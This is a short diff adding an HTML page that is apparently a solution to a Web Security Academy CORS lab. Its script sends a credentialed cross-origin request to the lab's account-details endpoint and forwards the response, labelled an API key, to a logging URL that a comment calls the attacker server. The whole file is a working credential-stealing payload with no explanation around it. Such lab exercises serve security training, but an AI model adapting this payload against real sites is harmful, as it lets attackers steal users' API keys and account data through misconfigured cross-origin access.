@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<body>
+    <h2>API key</h2>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener; //update URL to target domain
+        req.open('get', "https://acfb1fab1eec4325c03869c800bd0080.web-security-academy.net/accountDetails", async = true);
+
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            location = 'http://127.0.0.1:8000/log?key=' + this.responseText; //Attacker server IP and port
+        };
+
+    </script>
+</body>
+
+</html>
